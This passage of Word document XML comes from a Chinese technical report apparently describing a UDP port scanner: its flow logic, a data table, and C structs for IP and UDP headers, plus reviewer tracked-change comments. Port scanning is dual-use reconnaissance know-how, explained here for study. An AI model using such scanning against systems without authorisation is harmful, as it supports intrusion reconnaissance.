          <w:tcPr>
            <w:tcW w:w="3336" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A05DC3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5DDEF204"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CF765D5"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hint="eastAsia"/>
              </w:rPr>
              <w:t>功能</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45AE7" w:rsidRPr="00E90326" w14:paraId="786432D8" w14:textId="77777777" w:rsidTr="007D3B90">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3336" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="113D534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hostScan()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3910" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="78B15D2D" w14:textId="77777777" w:rsidR="00E45AE7" w:rsidRPr="00E90326" w:rsidRDefault="00E45AE7" w:rsidP="007D3B9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7508DFE" w14:textId="69948958" w:rsidR="00E45AE7" w:rsidRPr="00E90326" w:rsidRDefault="00EE5497" w:rsidP="007D3B90">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
              </w:rPr>
              <w:t>主机扫描</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="68ECCBBC" w14:textId="6263B19F" w:rsidR="007129C2" w:rsidRDefault="007129C2" w:rsidP="007129C2">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1075" w:name="_Toc482522637"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>UDP端口扫描</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1075"/>
    </w:p>
    <w:p w14:paraId="465E2A8D" w14:textId="4BF13A85" w:rsidR="00802D67" w:rsidRDefault="00F63841" w:rsidP="00802D67">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1076" w:name="_Toc482522638"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>流程图</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1076"/>
    </w:p>
    <w:p w14:paraId="005EDCDB" w14:textId="407570B0" w:rsidR="004D349B" w:rsidRPr="004D349B" w:rsidRDefault="004D349B" w:rsidP="00D12C41">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如流程图</w:t>
      </w:r>
      <w:r w:rsidR="00836EF7">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00836EF7">
        <w:t>.2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>所示，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>UDP</w:t>
      </w:r>
      <w:r w:rsidR="006B2EE6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>端口扫描先初始化</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>起始</w:t>
      </w:r>
      <w:r w:rsidR="00536CC4">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>端口，终止端口，当前发送端口，开始时间，结束时间，设置为可发送</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。开启捕获线程</w:t>
      </w:r>
      <w:r w:rsidR="00E262DC">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>然后判断是否发送完毕，</w:t>
      </w:r>
      <w:r w:rsidR="00E262DC">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>当可发送时，构造</w:t>
      </w:r>
      <w:r w:rsidR="00E262DC">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>UDP</w:t>
      </w:r>
      <w:r w:rsidR="00E262DC">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据包，发送到发送端口，设置为不可发送，等待捕获或超时。当捕获线程捕获到端口不可达时，存入</w:t>
      </w:r>
      <w:r w:rsidR="00E262DC" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>portScan</w:t>
      </w:r>
      <w:r w:rsidR="00E262DC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中，设置为可发送，发送端口增加。当超时</w:t>
      </w:r>
      <w:r w:rsidR="00241FCA">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的时</w:t>
      </w:r>
      <w:r w:rsidR="00E262DC">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>时，代表端口开放。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1756CE07" w14:textId="77777777" w:rsidR="00E30385" w:rsidRDefault="004D349B" w:rsidP="00512536">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3FD21935" wp14:editId="093AA247">
            <wp:extent cx="4084320" cy="572748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0995" cy="5736844"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="244D4FBC" w14:textId="584FD3C2" w:rsidR="004D349B" w:rsidRPr="00F05A40" w:rsidRDefault="00E30385" w:rsidP="00E30385">
      <w:pPr>
        <w:pStyle w:val="af3"/>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图4. </w:t>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图4. \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端口扫描流程图</w:t>
      </w:r>
      <w:ins w:id="1077" w:author="renxt" w:date="2017-05-13T20:57:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>（字太小，</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1078" w:author="renxt" w:date="2017-05-13T20:58:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>框内要用文字说明</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1079" w:author="renxt" w:date="2017-05-13T20:59:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>，</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1080" w:author="renxt" w:date="2017-05-13T21:14:00Z">
        <w:r w:rsidR="00D75002" w:rsidRPr="00D75002">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>用函数别人看不懂</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1081" w:author="renxt" w:date="2017-05-13T20:57:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="25934874" w14:textId="490C40E7" w:rsidR="00802D67" w:rsidRDefault="00F63841" w:rsidP="00802D67">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1082" w:name="_Toc482522639"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>主要数据</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1082"/>
    </w:p>
    <w:p w14:paraId="7622A8B2" w14:textId="11995BD0" w:rsidR="00F10C65" w:rsidRPr="00F10C65" w:rsidRDefault="00F10C65" w:rsidP="009176B9">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如表</w:t>
      </w:r>
      <w:r w:rsidR="001E5AF7">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="009E0C71">
        <w:t>.3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>所示，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>portScan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>map &lt;int, int&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>类型，存储端口扫描的情况。当端口不存在时，第一个int为端口，第二个int为1.</w:t>
      </w:r>
      <w:r w:rsidRPr="00F10C65">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>ip_address</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>是IP地址的表示，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>ip_header</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>头部，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>udp_header</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为UDP头部。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7A9A7F" w14:textId="51CBF59F" w:rsidR="00702C59" w:rsidRPr="00F05A40" w:rsidRDefault="00702C59" w:rsidP="00702C59">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">表 </w:t>
      </w:r>
      <w:r w:rsidR="001E5AF7" w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="001E5AF7" w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009E0C71" w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00F05A40">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>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702C59" w:rsidRPr="00E90326" w14:paraId="5706DCD4" w14:textId="77777777" w:rsidTr="001C4DAF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2122" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3D85CD15"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51197B6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599F8038"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介绍</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00702C59" w:rsidRPr="00E90326" w14:paraId="3FB291FD" w14:textId="77777777" w:rsidTr="001C4DAF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2122" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3D528DDA"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2318C00F"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map &lt;int, int&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="078CCD7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存放端口扫描结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00702C59" w:rsidRPr="00E90326" w14:paraId="15822B4C" w14:textId="77777777" w:rsidTr="001C4DAF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2122" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="40976F40"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ip_address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3412" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0C93CA03" w14:textId="783B53A2" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="001C4DAF">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:del w:id="1083" w:author="李勇" w:date="2017-05-13T21:55:00Z">
              <w:r w:rsidRPr="00E90326" w:rsidDel="00285EBE">
                <w:rPr>
                  <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                </w:rPr>
                <w:delText>T</w:delText>
              </w:r>
            </w:del>
            <w:ins w:id="1084" w:author="李勇" w:date="2017-05-13T21:55:00Z">
              <w:r w:rsidR="00AB5CD6">
                <w:rPr>
                  <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
                </w:rPr>
                <w:t>t</w:t>
              </w:r>
            </w:ins>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>ypedef struct ip_address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1CB98DD0"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IP地址表示</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00702C59" w:rsidRPr="00E90326" w14:paraId="24EE2AB2" w14:textId="77777777" w:rsidTr="001C4DAF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2122" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3DC3C812"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ip_header</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3412" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1ADF1CA1"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7C5A07E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702C59" w:rsidRPr="00E90326" w14:paraId="3FE104D5" w14:textId="77777777" w:rsidTr="001C4DAF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2122" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5FE8B93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udp_header</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3412" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7E1668EA" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="001C4DAF">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>typedef struct udp_header</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3CC3D57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123F9D8A" w14:textId="4B70C4BB" w:rsidR="00702C59" w:rsidRDefault="00702C59" w:rsidP="000B53A8">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表中的结构体：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8B7A0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ip_address{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD5D9B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byte1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="590DA2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byte2;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2CBA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byte3;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF86A11"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byte4;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D0B13F" w14:textId="13662279" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00365F8F" w:rsidP="00365F8F">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>}ip_address;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2C802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IPv4 header */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353C14FB"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ip_header{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CFDB45A" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="00702C59">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:left="840"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFCD2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7D1F0250"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29A8B0AC"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478E88D5"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42241EC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lastRenderedPageBreak/>
        <w:tab/>
        <w:t>u_char  ttl;            // Time to live</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBCC7F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u_char  proto;          // Protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5090F2"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Header checksum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD5668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saddr;      // Source address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CC6334"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090680E9"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u_int   op_pad;         // Option + Padding</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598C14E7" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="00702C59">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>}ip_header;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0ACCD7"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 UDP header*/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6135A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typedef struct udp_header{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F54816A"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sport;          // Source port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F5A45D"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dport;          // Destination port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15AF49F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len;            // Datagram length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B676AF" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="00702C59">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:tab/>
        <w:t>u_short crc;            // Checksum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2E934B" w14:textId="24CD7853" w:rsidR="00702C59" w:rsidRPr="00745C15" w:rsidRDefault="00702C59" w:rsidP="00745C15">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>}udp_header;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A216A0" w14:textId="7E41A196" w:rsidR="00802D67" w:rsidRDefault="00F63841" w:rsidP="00F63841">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
